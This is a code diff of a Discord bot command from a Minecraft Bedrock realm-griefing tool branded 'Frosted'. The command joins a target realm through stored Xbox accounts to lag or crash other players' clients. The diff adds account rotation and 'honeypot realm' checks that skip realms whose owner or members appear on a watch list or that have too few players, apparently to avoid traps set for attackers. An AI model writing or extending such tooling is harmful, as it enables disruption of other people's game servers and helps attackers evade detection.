@@ -4,7 +4,7 @@ const fs = require('node:fs');
 const colors = require('../../data/handles/colors.js');
 const path = require('path');
 const { createClient } = require('bedrock-protocol');
-const { dumprealm } = require('../../men/realms');
+const { dumprealm,getrealminfo,onlineusers } = require('../../men/realms');
 const { NIL, v3: uuidv3, v4: uuidv4 } = require('uuid');
 const { Authflow, Titles } = require("prismarine-auth");
 const skinData = require('../../data/client/jenny.json')
@@ -14,12 +14,20 @@ module.exports = {
         .setName("lag")
         .setIntegrationTypes(0, 1)
         .setContexts(0, 1, 2)
-        .setDescription("Crash a realm")
+        .setDescription("Lag Nearby Clients ")
+        .addIntegerOption(option =>
+            option.setName('account')
+                .setDescription('Account you wanna use')
+                .setRequired(true)
+                .addChoices(
+                    { name: 'Account 1', value: 1 },
+                    { name: 'Account 2', value: 2 },
+                    { name: 'Account 3', value: 3 }))
         .addStringOption(option =>
             option.setName('invite')
-                .setDescription('Realm invite code')
+                .setDescription('Realm invite code or Realm ID')
                 .setRequired(true)
-                .setMinLength(11)
+                .setMinLength(8)
                 .setMaxLength(15))
         .addIntegerOption(option =>
                     option.setName("duration")
@@ -39,7 +47,7 @@ module.exports = {
         const namespoof = interaction.options.getString('namespoof_name') || "discord.gg/frosted"
         const duration = interaction.options.getInteger('duration');
         let disconnected = false;
-
+        const account = interaction.options.getInteger('account')
         try {
             await interaction.reply({
                 embeds: [
@@ -52,7 +60,7 @@ module.exports = {
                 ],ephemeral: true,
             });
 
-            if (!fs.existsSync(`./data/client/frosted/${interaction.user.id}`)) {
+            if (!fs.existsSync(`./data/client/frosted/${interaction.user.id}/profile${account}`)) {
                 await interaction.editReply({
                     embeds: [
                         {
@@ -67,20 +75,83 @@ module.exports = {
             }
 
             const whitelist = JSON.parse(fs.readFileSync('./data/client/whitelist.json', 'utf8'));
-        const isWhitelisted = whitelist.some(entry => entry.realmCode === invite);
-        if (isWhitelisted) {
-            return interaction.editReply({
-                embeds: [
-                    new EmbedBuilder()
-                        .setTitle('Frosted Error')
-                        .setDescription(`The invite \`${invite}\` is in the whitelist and cannot be nuked.`)
-                        .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
-                        .setThumbnail(config.embeds.footerurl)
-                        .setColor(config.embeds.color)
-                ]
-            });
-        }
+            if (whitelist.includes(invite)) {
+                return interaction.editReply({
+                    embeds: [
+                        new EmbedBuilder()
+                            .setTitle('Frosted Error')
+                            .setDescription(`The invite \`${invite}\` is in the whitelist and cannot be nuked.`)
+                            .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
+                            .setThumbnail(config.embeds.footerurl)
+                            .setColor(config.embeds.color)
+                    ]
+                });
+            }
 
+            if (invite.length === 8) { // checks for realm id 
+                return;
+            }
+            const alert = "<a:alert:1324939657015726111>"
+            const club = await dumprealm(invite);
+            const realmInfo = await onlineusers(club.clubId, interaction);
+            const herm = await getrealminfo(invite);
+            const honeypotUsers = JSON.parse(fs.readFileSync('honeypot.json', 'utf8'));
+            const currentUsers = realmInfo.ingameMembers.map(member => member.gamerTag.toLowerCase());
+            const detectedUser = honeypotUsers.find(user => currentUsers.includes(user.toLowerCase()));
+            
+            if (detectedUser) {
+                return interaction.editReply({
+                    embeds: [
+                        new EmbedBuilder()
+                            .setTitle(alert + "Honeypot realm Detacted" + alert)
+                            .setDescription(`This Realm has been detacted as a Honeypot Realm. ` + "\nReason: `One or Multiple person in this Realm are on the Honeypot List`")
+                            .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
+                            .setThumbnail(config.embeds.footerurl)
+                            .setColor(config.embeds.color)
+                    ]
+                });
+            }
+            
+            const ownerGamertag = herm.owner.gamertag.toLowerCase();
+            if (honeypotUsers.includes(ownerGamertag)) {
+                return interaction.editReply({
+                    embeds: [
+                        new EmbedBuilder()
+                            .setTitle(alert + "Honeypot realm Detacted" + alert)
+                            .setDescription(`This Realm has been detacted as a Honeypot Realm. ` + "\nReason: `The Owner of this Realm is in the Honeypot List`")
+                            .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
+                            .setThumbnail(config.embeds.footerurl)
+                            .setColor(config.embeds.color)
+                    ]
+                });
+            }
+            
+            if (realmInfo.club.membersCount < 7) {
+                return interaction.editReply({
+                    embeds: [
+                        new EmbedBuilder()
+                            .setTitle(alert + "Honeypot realm Detacted" + alert)
+                            .setDescription(`This Realm has been detacted as a Honeypot Realm. ` + "\nReason: `Realm has to less Members < Required: 7`")
+                            .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
+                            .setThumbnail(config.embeds.footerurl)
+                            .setColor(config.embeds.color)
+                    ]
+                });
+            }
+            
+            if (club.server.playersonline === 1 || club.server.maxplayers === 2) {
+                return interaction.editReply({
+                    embeds: [
+                        new EmbedBuilder()
+                            .setTitle(alert + "Honeypot realm Detacted" + alert)
+                            .setDescription(`This Realm has been detacted as a Honeypot Realm. ` + "\nReason: `To less Players are online on this Realm < Required : 2`")
+                            .setFooter({ text: `${interaction.user.username} | discord.gg/frosted`, iconURL: config.embeds.footerurl })
+                            .setThumbnail(config.embeds.footerurl)
+                            .setColor(config.embeds.color)
+                    ]
+                });
+            }
+            
             const realm = await dumprealm(invite);
             if (!realm) {
                 console.error(`[${new Date().toLocaleTimeString()}] Error: Realm not found`);
@@ -100,7 +171,7 @@ module.exports = {
             const keypair = crypto.generateKeyPairSync("ec", { namedCurve: curve }).toString("base64");
             const bot = new Authflow(
                 interaction.user.id, 
-                path.resolve(`./data/client/frosted/${interaction.user.id}`), 
+                path.resolve(`./data/client/frosted/${interaction.user.id}/profile${account}`), 
                 {
                     flow: 'live',
                     authTitle: 'MinecraftNintendoSwitch',
@@ -109,10 +180,10 @@ module.exports = {
                 }
             );
             
-            async function refreshOrRetrieveTokens() {
+            async function imhungry() {
                 try {
-                    const xboxToken = await bot.getXboxToken();
-                    await bot.getMinecraftBedrockToken(keypair);
+                    const xboxToken = await bot.getXboxToken() // xbox :p
+                    await bot.getMinecraftBedrockToken(keypair) // bedrock token bc it migh be banned and the xbl one not
                     console.log('Susesfull Refreshed Token:', xboxToken);
                     return xboxToken;
                 } catch (error) {
@@ -133,7 +204,7 @@ module.exports = {
             (async () => {
                 console.log('Refreshing Token...');
                 
-                const token = await refreshOrRetrieveTokens();
+                const token = await imhungry();
                 if (token) {
                     console.log('Susessfull Refreshd Token');
                     
@@ -153,7 +224,7 @@ module.exports = {
             })();
 
             const client = createClient({
-                profilesFolder: `./data/client/frosted/${interaction.user.id}`,
+                profilesFolder: `./data/client/frosted/${interaction.user.id}/profile${account}`,
                 username: interaction.user.id,
                 offline: false,
                 realms: {
@@ -189,7 +260,8 @@ module.exports = {
                             .setColor(config.embeds.color)
                     ]
                 });
-                client.disconnect();
+                client.close
+                ();
             });
             
             let runtimeEntityId;
